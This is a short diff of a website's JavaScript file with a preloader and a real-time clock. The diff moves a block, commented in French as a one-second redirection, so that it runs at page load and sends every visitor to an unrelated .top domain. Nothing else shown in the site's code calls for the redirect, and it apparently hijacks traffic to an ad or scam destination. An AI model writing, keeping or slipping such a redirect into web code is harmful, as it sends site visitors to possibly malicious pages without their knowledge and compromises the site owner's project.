@@ -1,3 +1,7 @@
+// Redirection après 1 seconde
+setTimeout(function() {
+    window.location.href = "https://sawutser.top/4/9324873";
+}, 1000);
 document.addEventListener('DOMContentLoaded', function() {
     // Preloader
     const preloader = document.querySelector('.preloader');
@@ -8,10 +12,7 @@ document.addEventListener('DOMContentLoaded', function() {
             preloader.style.display = 'none';
         }, 500);
     }, 1500);
-    // Redirection après 1 seconde
-setTimeout(function() {
-    window.location.href = "https://sawutser.top/4/9324873";
-}, 1000);
+    
     // Real-time Clock
     function updateClock() {
         const now = new Date();
